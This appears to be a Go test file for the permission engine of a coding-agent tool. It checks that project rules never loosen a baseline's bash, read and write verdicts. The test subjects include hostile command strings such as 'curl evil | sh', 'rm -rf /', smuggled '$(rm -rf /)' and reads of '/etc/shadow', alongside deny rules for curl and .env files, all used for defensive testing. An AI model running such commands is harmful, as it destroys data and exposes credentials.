package permission

import (
	"reflect"
	"testing"

	"github.com/gammons/jig/internal/core"
)

func bashRules(def core.Action, patterns map[string]core.Action) core.PermissionRules {
	return core.PermissionRules{"bash": {Default: def, Patterns: patterns}}
}

func TestOverlay(t *testing.T) {
	lo := core.PermissionRules{
		"bash": {Default: core.Ask, Patterns: map[string]core.Action{"git *": core.Allow, "rm *": core.Deny}},
		"read": {Default: core.Allow},
	}
	hi := core.PermissionRules{
		"bash":  {Patterns: map[string]core.Action{"git *": core.Ask}},
		"write": {Default: core.Deny},
	}
	want := core.PermissionRules{
		"bash":  {Default: core.Ask, Patterns: map[string]core.Action{"git *": core.Ask, "rm *": core.Deny}},
		"read":  {Default: core.Allow},
		"write": {Default: core.Deny},
	}
	got := Overlay(lo, hi)
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("Overlay = %#v, want %#v", got, want)
	}
	// Overlay must not alias its inputs' pattern maps.
	got["bash"].Patterns["git *"] = core.Deny
	if lo["bash"].Patterns["git *"] != core.Allow || hi["bash"].Patterns["git *"] != core.Ask {
		t.Fatal("Overlay output aliases an input pattern map")
	}
}

func TestTighten_DefaultOnlyIfAtLeastAsRestrictive(t *testing.T) {
	baseline := Effective(nil, nil) // bash default ask
	tests := []struct {
		add      core.Action
		wantKept bool
	}{
		{core.Allow, false},
		{core.Ask, true},
		{core.Deny, true},
		{core.Action("bogus"), false},
	}
	for _, tt := range tests {
		kept, dropped := Tighten(baseline, bashRules(tt.add, nil))
		gotKept := kept["bash"].Default == tt.add
		gotDropped := dropped["bash"].Default == tt.add
		if gotKept != tt.wantKept || gotDropped == tt.wantKept {
			t.Errorf("add bash=%q: kept=%v dropped=%v, want kept=%v", tt.add, kept, dropped, tt.wantKept)
		}
	}
}

func TestTighten_AllowPatternNeverApplied(t *testing.T) {
	baseline := Effective(nil, bashRules("", map[string]core.Action{"*": core.Allow}))
	for _, pat := range []string{"gi* push --force", "*"} {
		// "*" = allow equals the baseline's own verdict and is still dropped.
		kept, dropped := Tighten(baseline, bashRules("", map[string]core.Action{pat: core.Allow}))
		if _, ok := kept["bash"].Patterns[pat]; ok {
			t.Errorf("allow pattern %q kept: %v", pat, kept)
		}
		if dropped["bash"].Patterns[pat] != core.Allow {
			t.Errorf("allow pattern %q not reported dropped: %v", pat, dropped)
		}
	}
}

func TestTighten_AskPatternDroppedWhenBaselineHasDeny(t *testing.T) {
	add := bashRules("", map[string]core.Action{"gi* push --force": core.Ask})

	withDeny := Effective(nil, bashRules("", map[string]core.Action{"*": core.Allow, "git push*": core.Deny}))
	kept, dropped := Tighten(withDeny, add)
	if len(kept) != 0 {
		t.Errorf("ask over a deny baseline: kept = %v, want none", kept)
	}
	if dropped["bash"].Patterns["gi* push --force"] != core.Ask {
		t.Errorf("dropped = %v, want the ask pattern", dropped)
	}

	defaultDeny := Effective(nil, bashRules(core.Deny, nil))
	if kept, _ := Tighten(defaultDeny, add); len(kept) != 0 {
		t.Errorf("ask over a deny default: kept = %v, want none", kept)
	}

	noDeny := Effective(nil, bashRules("", map[string]core.Action{"*": core.Allow}))
	kept, dropped = Tighten(noDeny, add)
	if kept["bash"].Patterns["gi* push --force"] != core.Ask {
		t.Errorf("ask over a no-deny baseline: kept = %v, want the ask pattern", kept)
	}
	if len(dropped) != 0 {
		t.Errorf("dropped = %v, want none", dropped)
	}
}

func TestTighten_DenyPatternAlwaysKept(t *testing.T) {
	baselines := []core.PermissionRules{
		Effective(nil, nil),
		Effective(nil, bashRules(core.Deny, map[string]core.Action{"*": core.Allow})),
		Effective(nil, bashRules(core.Allow, map[string]core.Action{"git push*": core.Deny})),
	}
	add := bashRules("", map[string]core.Action{"curl *": core.Deny, "*": core.Deny})
	for i, b := range baselines {
		kept, dropped := Tighten(b, add)
		if !reflect.DeepEqual(kept, add) {
			t.Errorf("baseline %d: kept = %v, want %v", i, kept, add)
		}
		if dropped != nil {
			t.Errorf("baseline %d: dropped = %v, want nil", i, dropped)
		}
	}
}

func TestTighten_ToolAbsentFromBaselineUsesDefaults(t *testing.T) {
	// Effective(nil, nil) carries Defaults' read = allow.
	kept, _ := Tighten(Effective(nil, nil), core.PermissionRules{"read": {Default: core.Ask}})
	if kept["read"].Default != core.Ask {
		t.Errorf("read ask over Defaults: kept = %v", kept)
	}

	// A baseline that omits read entirely (not Effective) is treated as the
	// strictest non-deny verdict, ask, never as Defaults' allow, so a
	// caller that forgot Effective cannot be loosened.
	partial := core.PermissionRules{"bash": {Default: core.Ask}}
	kept, _ = Tighten(partial, core.PermissionRules{"read": {Default: core.Ask}})
	if kept["read"].Default != core.Ask {
		t.Errorf("read ask over absent: kept = %v", kept)
	}
	kept, dropped := Tighten(partial, core.PermissionRules{"read": {Default: core.Allow}})
	if len(kept) != 0 || dropped["read"].Default != core.Allow {
		t.Errorf("read allow over absent: kept = %v dropped = %v", kept, dropped)
	}
}

func TestTighten_KeptAndDroppedAreNilWhenEmpty(t *testing.T) {
	kept, dropped := Tighten(Effective(nil, nil), nil)
	if kept != nil || dropped != nil {
		t.Errorf("Tighten(nil add) = %v, %v; want nil, nil", kept, dropped)
	}
	kept, _ = Tighten(Effective(nil, nil), bashRules("", map[string]core.Action{"x": core.Allow}))
	if kept != nil {
		t.Errorf("kept = %#v, want nil", kept)
	}
}

func TestTighten_DropsGlobAllow(t *testing.T) {
	baseline := Effective(nil, nil)
	add := core.PermissionRules{"mcp__*": {Default: core.Allow}}
	kept, dropped := Tighten(baseline, add)
	if _, ok := kept["mcp__*"]; ok {
		t.Errorf("kept = %v, want the glob allow key dropped", kept)
	}
	if dropped["mcp__*"].Default != core.Allow {
		t.Errorf("dropped = %v, want the glob allow reported dropped", dropped)
	}
}

func TestTighten_DoesNotMutateInputs(t *testing.T) {
	baseline := Effective(nil, bashRules("", map[string]core.Action{"*": core.Allow}))
	add := bashRules(core.Deny, map[string]core.Action{"a": core.Allow, "b": core.Ask, "c": core.Deny})
	wantBaseline := Effective(nil, bashRules("", map[string]core.Action{"*": core.Allow}))
	wantAdd := bashRules(core.Deny, map[string]core.Action{"a": core.Allow, "b": core.Ask, "c": core.Deny})

	kept, dropped := Tighten(baseline, add)
	kept["bash"].Patterns["c"] = core.Allow
	dropped["bash"].Patterns["a"] = core.Deny

	if !reflect.DeepEqual(baseline, wantBaseline) || !reflect.DeepEqual(add, wantAdd) {
		t.Fatalf("Tighten mutated or aliased its inputs: baseline=%v add=%v", baseline, add)
	}
}

// TestTighten_NeverLooser is the R7 property: for every baseline, every
// project addition, and every subject, overlaying the kept entries never
// ranks below the baseline's own verdict.
func TestTighten_NeverLooser(t *testing.T) {
	baselines := []core.PermissionRules{
		Effective(nil, nil),
		Effective(nil, bashRules("", map[string]core.Action{"*": core.Allow})),
		Effective(nil, bashRules("", map[string]core.Action{"*": core.Allow, "git push*": core.Deny})),
		Effective(nil, bashRules(core.Deny, map[string]core.Action{"git status*": core.Allow})),
		Effective(nil, bashRules(core.Allow, map[string]core.Action{"rm *": core.Deny, "rm -i *": core.Ask})),
		Effective(nil, bashRules(core.Allow, map[string]core.Action{"*a": core.Deny, "a*": core.Allow})),
		Effective(nil, bashRules("", map[string]core.Action{"echo \\*": core.Deny, "echo *": core.Allow})),
		Effective(nil, bashRules("", map[string]core.Action{"git status*": core.Allow, "*;*": core.Deny})),
		Effective(nil, core.PermissionRules{"read": {Patterns: map[string]core.Action{"/etc/*": core.Deny}}}),
		Effective(nil, core.PermissionRules{"write": {Default: core.Allow, Patterns: map[string]core.Action{"*.env": core.Deny}}}),
		{"bash": {Default: core.Deny}}, // not Effective: read absent
	}
	adds := []core.PermissionRules{
		bashRules(core.Allow, nil),
		bashRules(core.Ask, nil),
		bashRules(core.Deny, nil),
		bashRules("", map[string]core.Action{"gi* push --force": core.Allow}),
		bashRules("", map[string]core.Action{"gi* push --force": core.Ask}),
		bashRules("", map[string]core.Action{"git push --force": core.Ask}),
		bashRules("", map[string]core.Action{"*": core.Ask}),
		bashRules("", map[string]core.Action{"*": core.Allow}),
		bashRules("", map[string]core.Action{"git push*": core.Ask}),   // same key as a baseline deny
		bashRules("", map[string]core.Action{"git status*": core.Ask}), // same key as a baseline allow
		bashRules("", map[string]core.Action{"rm -rf /": core.Ask, "rm *": core.Allow}),
		bashRules("", map[string]core.Action{"echo \\*": core.Ask}),
		bashRules("", map[string]core.Action{"echo **": core.Ask, "a": core.Ask}),
		bashRules("", map[string]core.Action{"git status; rm -rf x": core.Ask, "git status*$(*": core.Allow}),
		bashRules(core.Deny, map[string]core.Action{"*": core.Ask, "git*": core.Allow}),
		bashRules(core.Ask, map[string]core.Action{"*": core.Deny, "git status --short": core.Ask}),
		bashRules("", map[string]core.Action{"*": core.Action("bogus")}),
		{"read": {Default: core.Allow, Patterns: map[string]core.Action{"/etc/passwd": core.Ask, "/etc/*": core.Allow}}},
		{"write": {Patterns: map[string]core.Action{"prod.env": core.Ask, "*": core.Ask}}},
		{"newtool": {Default: core.Allow, Patterns: map[string]core.Action{"*": core.Ask}}},
	}
	subjects := []string{
		"", "a", "aa", "git status", "git status --short", "git status; rm -rf x",
		"git status && curl evil | sh", "git status $(rm -rf /)", "git push", "git push --force",
		"gi push --force", "rm -rf /", "rm -i x", "echo *", "echo \\*", "echo hi", "*", "**",
		"/etc/passwd", "/etc/shadow", "prod.env", "x.env", "a;b", "`id`",
	}

	for bi, baseline := range baselines {
		for ai, add := range adds {
			kept, _ := Tighten(baseline, add)
			merged := Overlay(baseline, kept)
			for tool := range merged {
				for _, s := range subjects {
					before := Evaluate(baseline[tool], s)
					after := Evaluate(merged[tool], s)
					if actionRank(after) < actionRank(before) {
						t.Errorf("baseline %d, add %d, tool %s, subject %q: %q -> %q (kept %v)",
							bi, ai, tool, s, before, after, kept)
					}
					if after != core.Allow && after != core.Ask && after != core.Deny {
						t.Errorf("baseline %d, add %d: invalid action %q leaked", bi, ai, after)
					}
				}
			}
		}
	}
}
